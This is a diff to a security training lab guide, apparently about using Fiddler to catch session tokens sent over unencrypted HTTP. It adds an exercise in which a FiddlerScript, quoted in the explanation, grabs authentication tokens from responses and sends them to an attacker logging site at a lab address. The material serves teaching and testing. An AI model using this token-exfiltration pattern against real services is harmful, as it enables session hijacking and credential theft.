@@ -57,7 +57,13 @@ Exercise 3: Use Fiddler to find unprotected session IDs
 -----
 We can do some basic filtering using Fiddler's Filters tab - for instance we can set a filter to flag (highlight) either requests which send the X-Auth header or any 200 status response recevived from api/sessions, meaning the authentication process was successful.
 
-Using FiddlerScript - see http://docs.telerik.com/fiddler/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse for more details, we are going to implement the latter:
+Now put this together to customise Fiddler so it complains if any session ID tokens/cookies are sent over HTTP for either of the samples - you should now have a detailed understanding of exactly what you want to catch on each sample app. This will be the basis of our testing for this module - you will just run the apps with Fiddler capturing HTTP requests and flagging the bad ones.
+
+*Test-specific* There are some rules I cooked up earlier in the resources folder to highlight sensitive data in clear - these are specific to these sample apps, they'll need modifying for your real-world apps. @Devs, write your own ;-)
+
+As a further exercise, we can use the Attacker\_site sample with some additional Fiddler rules. The attacker site is a very simple site which collects and displays on screen any data which is sent to its api/logs endpoint as a query parameter on a GET request. The attacker sets this website up, then sits back and watches your secrets roll in. Let's set it up to intercept the session tokens as they are sent back from the server.
+
+Using FiddlerScript - see [http://docs.telerik.com/fiddler/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse](http://docs.telerik.com/fiddler/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse) for more details:
 
  1. Open the FiddlerRules files: Click Rules => Customized Rules... (or press Ctrl+R)
  2. Go to the method `static function OnBeforeResponse(oSession: Session)`  - or create one if needed
@@ -96,11 +102,7 @@ Using FiddlerScript - see http://docs.telerik.com/fiddler/KnowledgeBase/FiddlerS
  ``` 
 
 The script above will first intercept any successful authentication response from the targeted server (`oSession.HostnameIs("10.10.10.10") && oSession.uriContains("/api/sessions") && oSession.responseCode == 200`).
-When this happens, the authentication token will be collected from the response (`System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes)`) and sent to the attacker website in charge of collection stolen information (`Handlers.HTTPGet("http://10.10.10.11/api/logs/add",queryString)`).
-
-Now put this together to customise Fiddler so it complains if any session ID tokens/cookies are sent over HTTP for either of the samples - you should now have a detailed understanding of exactly what you want to catch on each sample app. This will be the basis of our testing for this module - you will just run the apps with Fiddler capturing HTTP requests and flagging the bad ones.
-
-*Test-specific* There are some rules I cooked up earlier in the resources folder - these are specific to these sample apps, they'll need modifying for your real-world apps. @Devs, write your own ;-)
+When this happens, the authentication token will be collected from the response (`System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes)`) and sent to the attacker website in charge of collecting stolen information (`Handlers.HTTPGet("http://10.10.10.30/api/logs/add",queryString)`).
 
 
 Exercise 4: See how the samples behave with HTTPS
